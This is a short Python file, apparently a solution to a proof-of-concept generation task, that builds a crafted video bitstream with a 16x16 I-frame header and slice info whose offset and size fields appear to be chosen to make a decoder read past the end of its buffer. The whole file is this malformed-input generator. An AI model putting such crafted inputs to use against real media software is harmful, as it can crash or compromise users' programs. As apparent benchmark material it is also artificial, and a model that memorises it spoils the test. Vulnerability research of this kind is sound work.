class _PocBitStream:
    def __init__(self):
        self.bits = ""

    def write(self, value: int, n_bits: int):
        self.bits += format(value, f'0{n_bits}b')

    def get_bytes(self) -> bytes:
        if not self.bits:
            return b''
        padded_bits = self.bits + '0' * ((-len(self.bits)) % 8)
        return int(padded_bits, 2).to_bytes(len(padded_bits) // 8, byteorder='big')

class Solution:
    def solve(self, src_path: str) -> bytes:
        bs = _PocBitStream()

        # I-frame Header (58 bits)
        bs.write(0, 1)      # ptype = I-frame
        bs.write(15, 12)    # width - 1 (width=16)
        bs.write(15, 12)    # height - 1 (height=16)
        bs.write(0, 13)     # tr
        bs.write(0, 2)      # dbq
        bs.write(0, 3)      # pq
        bs.write(0, 1)      # no RPR
        bs.write(0, 4)      # osv = 0
        bs.write(0, 1)      # no patch
        bs.write(1, 1)      # slice_structured = 1
        bs.write(0, 8)      # num_slices - 1 = 0

        # Slice Info (64 bits)
        total_bits = 58 + 32 + 32
        poc_len_bytes = (total_bits + 7) // 8
        offset = poc_len_bytes - 1
        bs.write(offset, 32)
        size = 256
        bs.write(size, 32)

        return bs.get_bytes()
